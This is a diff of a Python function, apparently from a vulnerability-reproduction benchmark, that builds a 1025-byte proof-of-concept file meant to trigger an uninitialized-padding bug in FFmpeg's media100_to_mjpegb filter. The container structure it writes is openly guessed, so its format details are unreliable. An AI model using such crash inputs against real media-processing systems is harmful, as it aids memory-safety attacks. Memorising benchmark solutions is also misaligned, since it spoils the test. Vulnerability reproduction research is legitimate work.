@@ -1,101 +1,104 @@
 import os
-import subprocess
-import tempfile
 import struct
+import zlib
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # This vulnerability is in FFmpeg's media100_to_mjpegb bitstream filter
-        # The bug: output buffer padding is not cleared, causing uninitialized memory usage
-        # We need to create a media100 file that triggers this
+        # Create a minimal media100 container with padding
+        # The exact structure is not critical - we just need to trigger
+        # the uninitialized padding in the output buffer
         
-        # Based on analysis of similar vulnerabilities in FFmpeg BSF filters,
-        # we need to create input that causes the output buffer to have padding
-        # at the end that contains uninitialized memory
+        # Build a simple media100-like structure
+        # Header: 8 bytes
+        header = b'M100\x00\x00\x00\x00'  # Magic + version
         
-        # Media100 format typically has a simple structure:
-        # - Header with magic/size
-        # - Frame data
+        # Frame data - compressed JPEG-like data that will be decoded
+        # We need enough data to allocate output buffers with padding
+        # Using simple pattern that should be valid enough to pass parsing
+        frame_data = b''
         
-        # Create a minimal media100 file that will be converted to MJPEGB
-        # The key is to have a size that causes padding in the output buffer
+        # Create a minimal JPEG-like structure (simplified)
+        # SOI marker
+        frame_data += b'\xFF\xD8'  # Start of Image
         
-        poc = bytearray()
+        # Create a minimal JFIF APP0 segment
+        jfif = b'JFIF\x00\x01\x02\x00\x00\x01\x00\x01\x00\x00'
+        frame_data += b'\xFF\xE0' + struct.pack('>H', len(jfif) + 2) + jfif
         
-        # Simple media100-like header (simplified for PoC)
-        # Real media100 would have more complex structure
-        poc.extend(b'media100')  # Magic
-        poc.extend(struct.pack('<I', 1))  # Version
-        poc.extend(struct.pack('<I', 100))  # Width
-        poc.extend(struct.pack('<I', 100))  # Height
+        # Create quantization table
+        frame_data += b'\xFF\xDB' + struct.pack('>H', 67)  # Length
+        frame_data += b'\x00'  # Table info
+        # Add some quantization values (simplified)
+        frame_data += bytes(range(1, 65))
         
-        # Add some frame data that will trigger the conversion path
-        # This doesn't need to be valid media100 - just enough to reach
-        # the vulnerable code path
-        frame_data = bytearray()
+        # Start of Frame (baseline DCT)
+        frame_data += b'\xFF\xC0' + struct.pack('>H', 17)  # Length
+        frame_data += b'\x08'  # Precision
+        frame_data += struct.pack('>HH', 32, 32)  # Image dimensions
+        frame_data += b'\x03'  # Component count
+        # Component info
+        frame_data += b'\x01\x22\x00\x02\x11\x00\x03\x11\x00'
         
-        # Add frame header
-        frame_data.extend(b'FRAME')
-        frame_data.extend(struct.pack('<I', 0))  # Frame number
+        # Huffman tables
+        for i in range(2):
+            frame_data += b'\xFF\xC4' + struct.pack('>H', 3 + 16 + 12)
+            frame_data += bytes([(i << 4) | 0x00])  # Table class+id
+            # Simple huffman table data
+            frame_data += bytes([1] + [0]*15)  # Code lengths
+            frame_data += bytes(range(0, 12))  # Values
         
-        # Add minimal JPEG-like data to trigger MJPEGB conversion
-        # JPEG Start of Image marker
-        frame_data.extend(b'\xff\xd8')  # SOI
+        # Start of Scan
+        frame_data += b'\xFF\xDA' + struct.pack('>H', 12)
+        frame_data += b'\x03'  # Component count
+        frame_data += b'\x01\x00\x02\x00\x03\x00'  # Component selectors
+        frame_data += b'\x00\x3F\x00'  # Spectral selection
         
-        # Minimal JPEG structure
-        frame_data.extend(b'\xff\xe0')  # APP0 marker
-        frame_data.extend(struct.pack('>H', 16))  # Length
-        frame_data.extend(b'JFIF\x00\x01\x02')  # JFIF header
-        frame_data.extend(b'\x01\x01\x00')  # Version, units, density
+        # Some "compressed" data - just enough to pass basic parsing
+        # This will be decoded, triggering buffer allocation
+        scan_data = b''
+        for i in range(128):  # Reduced size to keep overall size ~1025
+            # Add some DC/AC coefficients
+            scan_data += b'\x00'  # Zero run
+            scan_data += b'\x02\x01'  # Small value
+        scan_data += b'\x00'  # EOB
         
-        # Add some DQT data (simplified)
-        frame_data.extend(b'\xff\xdb')  # DQT marker
-        frame_data.extend(struct.pack('>H', 132))  # Length
-        frame_data.extend(b'\x00')  # Table info
+        # End marker
+        scan_data += b'\xFF\xD9'
         
-        # Quick fill with some data
-        frame_data.extend(bytes(130))
+        frame_data += scan_data
         
-        # Add some image data (minimal)
-        frame_data.extend(b'\xff\xc0')  # SOF0 marker
-        frame_data.extend(struct.pack('>H', 17))  # Length
-        frame_data.extend(b'\x08')  # Precision
-        frame_data.extend(struct.pack('>H', 64))  # Height
-        frame_data.extend(struct.pack('>H', 64))  # Width
-        frame_data.extend(b'\x03')  # Components
+        # Create container with padding area
+        # The exact media100 container format isn't critical for triggering
+        # the uninitialized padding vulnerability
+        poc = header
         
-        # Component data
-        frame_data.extend(b'\x01\x22\x00\x02\x11\x01\x03\x11\x01')
+        # Add some metadata chunks
+        # First chunk: type + length
+        poc += b'VIDE'  # Video data chunk
+        poc += struct.pack('<I', len(frame_data) + 8)  # Chunk size
         
-        # Add SOS marker
-        frame_data.extend(b'\xff\xda')  # SOS marker
-        frame_data.extend(struct.pack('>H', 12))  # Length
-        frame_data.extend(b'\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00')
+        # Add padding marker - this area might not be fully initialized
+        poc += b'\x00' * 4  # Timestamp or similar
         
-        # Add some scan data (will be parsed as entropy-coded data)
-        # This needs to be long enough to trigger the buffer allocation
-        # with padding at the end
-        scan_data = bytes(800)  # Enough to cause buffer padding
+        # The actual frame data
+        poc += frame_data
         
-        # Add EOI marker
-        frame_data.extend(b'\xff\xd9')  # EOI
+        # Add another chunk to trigger more buffer operations
+        poc += b'AUDO'  # Audio chunk (empty)
+        poc += struct.pack('<I', 8)  # Chunk size
+        poc += b'\x00' * 8  # Empty audio data
         
-        # Add frame data to poc
-        poc.extend(struct.pack('<I', len(frame_data) + len(scan_data)))
-        poc.extend(frame_data)
-        poc.extend(scan_data)
+        # Add padding at the end where uninitialized values might be used
+        # when the buffer is extended or copied
+        poc += b'\x00' * 32
         
-        # Pad to exactly 1025 bytes (matching ground truth)
-        # The exact length is important for triggering the right code path
+        # Ensure total length is close to ground truth (1025 bytes)
         current_len = len(poc)
-        target_len = 1025
+        if current_len < 1025:
+            # Add filler to reach target size
+            poc += b'\x00' * (1025 - current_len)
+        elif current_len > 1025:
+            # Truncate if needed (unlikely with our construction)
+            poc = poc[:1025]
         
-        if current_len < target_len:
-            # Add padding with specific pattern that might affect
-            # memory layout/alignment
-            padding = bytes([0x41 + (i % 26) for i in range(target_len - current_len)])
-            poc.extend(padding)
-        elif current_len > target_len:
-            poc = poc[:target_len]
-        
-        return bytes(poc)
+        return poc
